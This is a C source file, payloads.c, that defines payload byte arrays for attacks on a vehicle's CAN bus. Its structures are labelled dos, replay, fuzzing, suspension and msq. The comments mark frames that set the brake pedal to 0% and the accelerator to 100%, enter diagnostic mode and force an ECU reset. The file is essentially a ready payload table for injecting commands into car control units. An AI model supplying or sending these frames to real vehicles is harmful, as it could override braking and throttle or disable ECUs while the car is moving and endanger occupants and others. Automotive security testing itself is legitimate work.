#include "payloads.h"

/*================================================================
payloads.c
this function resets payload structures
==================================================================*/

struct payloads dos = {
    .payload1= {0x12, 0x34, 0x56, 0x78, 0x12, 0x34, 0x56, 0x78},
    .payload1_len = 8
};

struct payloads replay ={
    .payload1 = {0x00, 0x00, 0xDF, 0x9D, 0x35, 0xEE, 0x12, 0x12},   //tx payload break pedal 0%
    .payload2 = {0x0F, 0xC5, 0xD3, 0x99, 0xDD, 0x21, 0x12, 0x12},   //tx payload acceel pedal 100%
    .payload1_len = 8,
    .payload2_len = 8
};

struct payloads fuzzing = {
    .payload1 = {0x02, 0x3E, 0x00},                                 //tx payload to make reply
    .payload2 = {0x02, 0x7E, 0x00},                                 //rx payload to check ecu live
    .payload3 = {0x00, 0x00, 0xD2, 0x11, 0x73, 0x58, 0xFA, 0xF8},   //fuzzing_random_canid payload
    .payload1_len = 3,
    .payload2_len = 3,
    .payload3_len = 8
};

struct payloads suspension ={
    .payload1 = {0x02, 0x10, 0x02},                                 //tx payload to enter diag mode
    .payload2 = {0x02, 0x11, 0x01},                                 //tx payload to make ecu reset
    .payload1_len = 3,
    .payload2_len = 3
};

struct payloads msq = {
    .payload1 = {0x02, 0x10, 0x02},                                  //tx payload to enter diag mode
    .payload2= {0x02, 0x11, 0x01},                                  //tx payload to make ecu reset
    .payload3 = {0x00, 0x00, 0xDF, 0x9D, 0x35, 0xEE, 0x12, 0x12},    //tx payload break pedal 0%
    .payload4 = {0x0F, 0xC5, 0xD3, 0x99, 0xDD, 0x21, 0x12, 0x12},    //tx payload acceel pedal 100%
    .payload1_len = 3,
    .payload2_len = 3,
    .payload3_len = 8,
    .payload4_len = 8
};
